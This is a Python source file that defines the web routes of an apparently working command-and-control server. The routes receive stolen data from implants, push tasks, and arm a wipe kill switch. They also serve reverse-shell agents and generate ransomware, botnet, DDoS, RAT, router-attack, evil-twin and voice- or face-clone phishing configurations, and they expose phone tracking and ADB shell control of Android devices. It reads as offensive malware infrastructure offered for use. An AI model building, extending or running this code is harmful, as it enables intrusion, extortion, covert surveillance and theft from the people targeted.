"""quantum.c2.routes — every C2 route (/s /r /ai /kill /federation /dash)."""
from __future__ import annotations

import base64
import json
import os
import threading
import time

from quantum.c2.app import FEDERATION, decrypt_beacon
from quantum.core.deps import Response, jsonify, request
from quantum.core.env import LOG_DIR, LOOT_DIR
from quantum.core.grayfish import GRAYFISH
from quantum.core.logging import MitreMapper, _tail_jsonl, log
from quantum.dash import DASH_HTML
from quantum.postexploit.harvest import auto_parse_loot
from quantum.postexploit.killswitch import KILLSWITCH, TASKQ, kill_all_implants


def register_routes(app, agents, API):

    @app.route("/s", defaults={"profile": "default"})
    @app.route("/s/<profile>")
    def s(profile):
        agent_text = agents.get(profile)
        if not agent_text: return "unknown profile", 404
        return agent_text, 200, {"Content-Type": "text/plain"}

    @app.route("/r", methods=["POST"])
    def r():
        d = request.json or {}
        host = d.get("host", "?")
        task, TASKQ[host] = TASKQ.get(host, {}), {}
        if d.get("data") and not d.get("k"):
            os.makedirs(os.path.join(LOOT_DIR, host), exist_ok=True)
            fn = os.path.join(LOOT_DIR, host, f"posix_drop_{int(time.time())}.txt")
            try: open(fn, "wb").write(base64.b64decode(d["data"]))
            except Exception: open(fn, "w").write(str(d["data"]))
            GRAYFISH.seal(fn)
            log(f"C2 posix loot {host} -> {fn}.gfy", "C2")
            return jsonify(task or {"act": "none"})
        if d.get("act") == "hb":
            # V3.1: keylogger buffer pull is automatic — if a kl.klq arrives, seal it
            log(f"C2 hb {host}; reply {task or 'none'}", "C2")
            threading.Thread(target=API.turbine.enroll,
                             args=(host, {"heartbeat": True}), daemon=True).start()
            return jsonify(task or {"act": "none"})
        try: blob = decrypt_beacon(d)
        except Exception as e:
            log(f"decrypt fail {host}: {e}", "ERR"); return jsonify({"act": "none"})
        os.makedirs(os.path.join(LOOT_DIR, host), exist_ok=True)
        fn = os.path.join(LOOT_DIR, host, f"drop_{int(time.time())}.zip")
        open(fn, "wb").write(blob)
        log(f"C2 loot {host}: {len(blob)} bytes", "C2")
        auto_parse_loot(host, fn)
        GRAYFISH.seal(fn)
        return jsonify(task or {"act": "none"})

    @app.route("/ai", methods=["POST"])
    def ai_api():
        d = request.json or {}
        return jsonify(API.handle(d.get("cmd", ""), d.get("params", {})))

    @app.route("/kill", methods=["POST"])
    def kill_switch():
        """V3.1: covert kill-switch — sets wipe/die tasks on every implant queue
        (delivery rides each implant's own encrypted beacon pull)."""
        arm = (request.json or {}).get("arm", True)
        if arm:
            return jsonify(kill_all_implants(wipe_first=(request.json or {}).get("wipe", True)))
        KILLSWITCH["on"] = False
        return jsonify({"killed": [], "note": "kill-switch disarmed"})

    @app.route("/federation/reg", methods=["GET", "POST"])
    def fed_reg():
        if request.method == "POST":
            remote = (request.json or {}).get("implants", {})
            with API.turbine.lock:
                for h, rec in remote.items():
                    if h not in API.turbine.implants: API.turbine.implants[h] = rec
        return jsonify({"implants": API.turbine.implants, "onion": FEDERATION.onion})

    @app.route("/federation/peer", methods=["POST"])
    def fed_peer():
        onion = (request.json or {}).get("onion")
        if onion and onion not in FEDERATION.peers:
            FEDERATION.peers.append(onion)
            open(os.path.join(LOG_DIR, "federation", "peers.json"), "w").write(json.dumps(FEDERATION.peers))
            log(f"FEDERATION: new peer {onion}", "FED")
        return jsonify({"peers": FEDERATION.peers})

    @app.route("/dash")
    def dash():
        return Response(DASH_HTML, mimetype="text/html")

    @app.route("/dash/api/state")
    def dash_state():
        return jsonify({
            "decisions": _tail_jsonl(os.path.join(LOG_DIR, "decisions.jsonl"), 100),
            "audit":     _tail_jsonl(os.path.join(LOG_DIR, "audit.jsonl"), 200),
            "mitre":     MitreMapper().map_audit().get("coverage", []),
            "killswitch": KILLSWITCH["on"],
        })

    # ---- Unique Listener Deployment ----
    @app.route("/api/listener/deploy", methods=["POST"])
    def listener_deploy():
        from quantum.c2.listener import ListenerManager
        d = request.json or {}
        mgr = ListenerManager()
        listener = mgr.deploy(
            name=d.get("name", f"engagement-{int(time.time())}"),
            target=d.get("target", "unknown"),
            exploit_type=d.get("exploit", "unknown"),
            payload_path=d.get("payload"),
            port=d.get("port"),
        )
        if listener:
            return jsonify(listener.status())
        return jsonify({"error": "deploy failed"}), 500

    @app.route("/api/listener/stop", methods=["POST"])
    def listener_stop():
        from quantum.c2.listener import ListenerManager
        d = request.json or {}
        port = d.get("port")
        if not port:
            return jsonify({"error": "port required"}), 400
        mgr = ListenerManager()
        ok = mgr.stop(port)
        return jsonify({"stopped": ok, "port": port})

    @app.route("/api/listener/stopall", methods=["POST"])
    def listener_stopall():
        from quantum.c2.listener import ListenerManager
        mgr = ListenerManager()
        mgr.stop_all()
        return jsonify({"stopped": "all"})

    @app.route("/api/listeners")
    def listener_list():
        from quantum.c2.listener import ListenerManager
        mgr = ListenerManager()
        return jsonify(mgr.list_all())

    @app.route("/api/listeners/active")
    def listener_active():
        from quantum.c2.listener import ListenerManager
        mgr = ListenerManager()
        return jsonify(mgr.get_active())

    @app.route("/api/listener/hits")
    def listener_hits():
        from quantum.c2.listener import ListenerManager
        port = request.args.get("port")
        if not port:
            return jsonify({"error": "port required"}), 400
        mgr = ListenerManager()
        return jsonify(mgr.get_hits(port))

    # ---- DoH Reverse Shell ----
    @app.route("/api/dohshell/agent/posix")
    def dohshell_agent_posix():
        from quantum.c2.reverseshell import generate_doh_reverse_shell_agent
        domain = request.args.get("domain", "c2.example.com")
        c2_host = request.args.get("c2", "192.168.1.1:8443")
        fn = generate_doh_reverse_shell_agent(domain, c2_host)
        with open(fn, encoding="utf-8") as f:
            return f.read(), 200, {"Content-Type": "text/plain"}

    @app.route("/api/dohshell/agent/windows")
    def dohshell_agent_windows():
        from quantum.c2.reverseshell import generate_windows_doh_reverse_shell
        domain = request.args.get("domain", "c2.example.com")
        c2_host = request.args.get("c2", "192.168.1.1:8443")
        fn = generate_windows_doh_reverse_shell(domain, c2_host)
        with open(fn, encoding="utf-8") as f:
            return f.read(), 200, {"Content-Type": "text/plain"}

    @app.route("/api/dohshell/targets")
    def dohshell_targets():
        from quantum.c2.reverseshell import DoHBeaconReceiver
        domain = request.args.get("domain", "c2.example.com")
        receiver = DoHBeaconReceiver(domain)
        return jsonify(receiver.get_active_targets())

    @app.route("/api/dohshell/task", methods=["POST"])
    def dohshell_task():
        from quantum.c2.reverseshell import DoHBeaconReceiver
        d = request.json or {}
        domain = d.get("domain", "c2.example.com")
        host_id = d.get("host_id", "hq")
        command = d.get("command", "shell")
        params = d.get("params", {})
        receiver = DoHBeaconReceiver(domain)
        task = receiver.push_task(host_id, command, params)
        return jsonify(task)

    @app.route("/api/dohshell/config")
    def dohshell_config():
        from quantum.c2.reverseshell import generate_android_c2_config
        domain = request.args.get("domain", "c2.example.com")
        return jsonify(generate_android_c2_config(domain))

    # ---- OSINT Trackers ----
    @app.route("/api/osint/ip/<ip>")
    def osint_ip(ip):
        from quantum.recon.trackers import track_ip_downloads
        return jsonify(track_ip_downloads(ip))

    @app.route("/api/osint/imei/<imei>")
    def osint_imei(imei):
        from quantum.recon.trackers import track_imei
        return jsonify(track_imei(imei))

    @app.route("/api/osint/phone/<phone>")
    def osint_phone(phone):
        from quantum.recon.trackers import track_phone_location
        return jsonify(track_phone_location(phone))

    # ---- RAT Dashboard ----
    @app.route("/api/rat/repos")
    def rat_repos():
        from quantum.control.rat import list_rat_repos
        return jsonify(list_rat_repos())

    @app.route("/api/rat/generate", methods=["POST"])
    def rat_generate():
        from quantum.control.rat import generate_rat_server
        d = request.json or {}
        return jsonify(generate_rat_server(
            d.get("repo", "sliver"),
            d.get("host", "0.0.0.0"),
            d.get("port", 8443),
            d.get("password"),
        ))

    @app.route("/api/rat/features")
    def rat_features():
        from quantum.control.rat import mspy_feature_list, messaging_app_list
        return jsonify({"features": mspy_feature_list(), "messaging_apps": messaging_app_list()})

    @app.route("/api/rat/state")
    def rat_state():
        from quantum.control.rat import rat_dashboard_state
        return jsonify(rat_dashboard_state())

    # ---- Ransomware ----
    @app.route("/api/ransomware/tools")
    def ransomware_tools():
        from quantum.control.ransomware import list_ransomware_tools
        return jsonify(list_ransomware_tools())

    @app.route("/api/ransomware/modules")
    def ransomware_modules():
        from quantum.control.ransomware import list_deployment_modules
        return jsonify(list_deployment_modules())

    @app.route("/api/ransomware/generate", methods=["POST"])
    def ransomware_generate():
        from quantum.control.ransomware import generate_ransomware_config
        d = request.json or {}
        return jsonify(generate_ransomware_config(
            d.get("tool", "lockbit"),
            d.get("target_os", "Windows"),
            d.get("encryption", "AES-256-GCM"),
            d.get("ransom_amount", 1000.0),
            d.get("wallet_address"),
            d.get("contact_email"),
        ))

    @app.route("/api/ransomware/state")
    def ransomware_state():
        from quantum.control.ransomware import ransomware_dashboard_state
        return jsonify(ransomware_dashboard_state())

    # ---- Botnet ----
    @app.route("/api/botnet/types")
    def botnet_types():
        from quantum.control.botnet import list_botnet_types
        return jsonify(list_botnet_types())

    @app.route("/api/botnet/capabilities")
    def botnet_capabilities():
        from quantum.control.botnet import list_botnet_capabilities
        return jsonify(list_botnet_capabilities())

    @app.route("/api/botnet/generate", methods=["POST"])
    def botnet_generate():
        from quantum.control.botnet import generate_botnet_config
        d = request.json or {}
        return jsonify(generate_botnet_config(
            d.get("type", "irc"),
            d.get("c2_host", "0.0.0.0"),
            d.get("c2_port", 6667),
            d.get("max_bots", 1000),
        ))

    @app.route("/api/botnet/state")
    def botnet_state():
        from quantum.control.botnet import botnet_dashboard_state
        return jsonify(botnet_dashboard_state())

    # ---- DDoS ----
    @app.route("/api/ddos/tools")
    def ddos_tools():
        from quantum.control.ddos import list_ddos_tools
        return jsonify(list_ddos_tools())

    @app.route("/api/ddos/techniques")
    def ddos_techniques():
        from quantum.control.ddos import list_ddos_techniques
        return jsonify(list_ddos_techniques())

    @app.route("/api/ddos/generate", methods=["POST"])
    def ddos_generate():
        from quantum.control.ddos import generate_ddos_config
        d = request.json or {}
        return jsonify(generate_ddos_config(
            d.get("tool", "loris"),
            d.get("target", ""),
            d.get("port", 80),
            d.get("threads", 100),
            d.get("duration", 60),
        ))

    @app.route("/api/ddos/state")
    def ddos_state():
        from quantum.control.ddos import ddos_dashboard_state
        return jsonify(ddos_dashboard_state())

    # ---- Messaging / Social Engineering ----
    @app.route("/api/messaging/platforms")
    def messaging_platforms():
        from quantum.social.messaging import list_messaging_platforms
        return jsonify(list_messaging_platforms())

    @app.route("/api/messaging/techniques")
    def messaging_techniques():
        from quantum.social.messaging import list_social_engineering_techniques
        return jsonify(list_social_engineering_techniques())

    @app.route("/api/messaging/voice_clone")
    def messaging_voice_clone():
        from quantum.social.messaging import list_voice_clone_providers
        return jsonify(list_voice_clone_providers())

    @app.route("/api/messaging/face_clone")
    def messaging_face_clone():
        from quantum.social.messaging import list_face_clone_providers
        return jsonify(list_face_clone_providers())

    @app.route("/api/messaging/campaign", methods=["POST"])
    def messaging_campaign():
        from quantum.social.messaging import generate_social_engineering_campaign
        d = request.json or {}
        return jsonify(generate_social_engineering_campaign(
            d.get("platform", "whatsapp"),
            d.get("technique", "phishing"),
            d.get("target", ""),
            d.get("ai_provider", "abliteratus"),
        ))

    @app.route("/api/messaging/state")
    def messaging_state():
        from quantum.social.messaging import messaging_dashboard_state
        return jsonify(messaging_dashboard_state())

    # ---- Steganography ----
    @app.route("/api/stego/methods")
    def stego_methods():
        from quantum.exploits.steganography import list_steganography_methods
        return jsonify(list_steganography_methods())

    @app.route("/api/stego/pdf_exploits")
    def stego_pdf_exploits():
        from quantum.exploits.steganography import list_pdf_exploit_methods
        return jsonify(list_pdf_exploit_methods())

    @app.route("/api/stego/messenger_chains")
    def stego_messenger_chains():
        from quantum.exploits.steganography import list_messenger_parse_chains
        return jsonify(list_messenger_parse_chains())

    @app.route("/api/stego/state")
    def stego_state():
        from quantum.exploits.steganography import steganography_dashboard_state
        return jsonify(steganography_dashboard_state())

    # ---- Router Exploits ----
    @app.route("/api/router/vulnerabilities")
    def router_vulnerabilities():
        from quantum.exploits.router import list_router_vulnerabilities
        return jsonify(list_router_vulnerabilities())

    @app.route("/api/router/default_creds")
    def router_default_creds():
        from quantum.exploits.router import list_default_credentials
        return jsonify(list_default_credentials())

    @app.route("/api/router/attack_methods")
    def router_attack_methods():
        from quantum.exploits.router import list_router_attack_methods
        return jsonify(list_router_attack_methods())

    @app.route("/api/router/scan", methods=["POST"])
    def router_scan():
        from quantum.exploits.router import scan_router
        d = request.json or {}
        return jsonify(scan_router(d.get("ip", ""), d.get("port", 80)))

    @app.route("/api/router/generate", methods=["POST"])
    def router_generate():
        from quantum.exploits.router import generate_router_attack_config
        d = request.json or {}
        return jsonify(generate_router_attack_config(
            d.get("method", "default_creds"),
            d.get("target", ""),
            d.get("port", 80),
        ))

    @app.route("/api/router/state")
    def router_state():
        from quantum.exploits.router import router_dashboard_state
        return jsonify(router_dashboard_state())

    # ---- APN Attacks ----
    @app.route("/api/apn/hardware")
    def apn_hardware():
        from quantum.exploits.apn import list_apn_hardware
        return jsonify(list_apn_hardware())

    @app.route("/api/apn/methods")
    def apn_methods():
        from quantum.exploits.apn import list_apn_attack_methods
        return jsonify(list_apn_attack_methods())

    @app.route("/api/apn/scan_beacons", methods=["POST"])
    def apn_scan_beacons():
        from quantum.exploits.apn import scan_beacons
        d = request.json or {}
        return jsonify(scan_beacons(d.get("interface", "wlan0")))

    @app.route("/api/apn/generate", methods=["POST"])
    def apn_generate():
        from quantum.exploits.apn import generate_apn_attack_config
        d = request.json or {}
        return jsonify(generate_apn_attack_config(
            d.get("method", "evil_twin"),
            d.get("hardware", "wifi_pineapple"),
            d.get("target"),
        ))

    @app.route("/api/apn/state")
    def apn_state():
        from quantum.exploits.apn import apn_dashboard_state
        return jsonify(apn_dashboard_state())

    # ---- EXIF Analysis ----
    @app.route("/api/exif/analyze", methods=["POST"])
    def exif_analyze():
        from quantum.recon.exif import analyze_exif
        d = request.json or {}
        return jsonify(analyze_exif(d.get("image_path", "")))

    @app.route("/api/exif/state")
    def exif_state():
        from quantum.recon.exif import exif_dashboard_state
        return jsonify(exif_dashboard_state())

    # ---- Dark Web ----
    @app.route("/api/darkweb/services")
    def darkweb_services():
        from quantum.markets.darkweb import list_onion_services
        return jsonify(list_onion_services())

    @app.route("/api/darkweb/state")
    def darkweb_state():
        from quantum.markets.darkweb import darkweb_dashboard_state
        return jsonify(darkweb_dashboard_state())

    # ---- Google Dorks ----
    @app.route("/api/dorks/categories")
    def dorks_categories():
        from quantum.recon.dorks import list_dork_categories
        return jsonify(list_dork_categories())

    @app.route("/api/dorks/state")
    def dorks_state():
        from quantum.recon.dorks import dorks_dashboard_state
        return jsonify(dorks_dashboard_state())

    # ---- Shodan ----
    @app.route("/api/shodan/presets")
    def shodan_presets():
        from quantum.recon.shodan import list_shodan_presets
        return jsonify(list_shodan_presets())

    @app.route("/api/shodan/search", methods=["POST"])
    def shodan_search():
        from quantum.recon.shodan import shodan_search
        d = request.json or {}
        return jsonify(shodan_search(d.get("query", ""), d.get("api_key"), d.get("limit", 100)))

    @app.route("/api/shodan/host/<ip>")
    def shodan_host(ip):
        from quantum.recon.shodan import shodan_host_info
        return jsonify(shodan_host_info(ip))

    @app.route("/api/shodan/state")
    def shodan_state():
        from quantum.recon.shodan import shodan_dashboard_state
        return jsonify(shodan_dashboard_state())

    # ---- 2D Map ----
    @app.route("/api/map2d/data", methods=["POST"])
    def map2d_data():
        from quantum.control.map2d import generate_map_data
        d = request.json or {}
        return jsonify(generate_map_data(d.get("beacons", [])))

    @app.route("/api/map2d/state")
    def map2d_state():
        from quantum.control.map2d import map2d_dashboard_state
        return jsonify(map2d_dashboard_state())

    # ---- PhantomDroid ADB ----
    @app.route("/api/phantomdroid/features")
    def phantomdroid_features():
        from quantum.control.phantomdroid import list_phantomdroid_features
        return jsonify(list_phantomdroid_features())

    @app.route("/api/phantomdroid/devices")
    def phantomdroid_devices():
        from quantum.control.phantomdroid import discover_adb_devices
        return jsonify(discover_adb_devices())

    @app.route("/api/phantomdroid/connect", methods=["POST"])
    def phantomdroid_connect():
        from quantum.control.phantomdroid import connect_adb_wireless
        d = request.json or {}
        return jsonify(connect_adb_wireless(d.get("ip", ""), d.get("port", 5555)))

    @app.route("/api/phantomdroid/shell", methods=["POST"])
    def phantomdroid_shell():
        from quantum.control.phantomdroid import adb_shell
        d = request.json or {}
        return jsonify(adb_shell(d.get("serial", ""), d.get("command", "")))

    @app.route("/api/phantomdroid/screencap", methods=["POST"])
    def phantomdroid_screencap():
        from quantum.control.phantomdroid import adb_screencap
        d = request.json or {}
        return jsonify(adb_screencap(d.get("serial", ""), d.get("output_path", "")))

    @app.route("/api/phantomdroid/device_info", methods=["POST"])
    def phantomdroid_device_info():
        from quantum.control.phantomdroid import adb_get_device_info
        d = request.json or {}
        return jsonify(adb_get_device_info(d.get("serial", "")))

    @app.route("/api/phantomdroid/state")
    def phantomdroid_state():
        from quantum.control.phantomdroid import phantomdroid_dashboard_state
        return jsonify(phantomdroid_dashboard_state())

    return app
